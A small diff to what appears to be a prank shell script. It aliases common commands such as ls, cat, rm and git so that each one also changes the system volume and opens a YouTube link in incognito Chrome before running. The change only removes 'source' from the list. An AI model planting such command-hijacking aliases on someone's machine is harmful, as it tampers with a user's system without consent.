@@ -2,7 +2,7 @@
 LINK='https://youtu.be/Pgs79yOlhGI?t=2'
 VOLUME='0'
 
-for cmd in 'ls' 'cat' 'unalias' 'python' 'python3' 'gcc' 'g++' 'vim' 'cd' 'nano' 'emacs' 'rm' 'git' 'find' 'make' 'open' 'alias' 'source'
+for cmd in 'ls' 'cat' 'unalias' 'python' 'python3' 'gcc' 'g++' 'vim' 'cd' 'nano' 'emacs' 'rm' 'git' 'find' 'make' 'open' 'alias'
 do
 	ALIAS_FUNCTION="osascript -e 'set Volume ${VOLUME}' && open -na 'Google Chrome' --args --incognito '${LINK}'; ${cmd}"
 	ALIAS="alias ${cmd}=\"${ALIAS_FUNCTION}\""
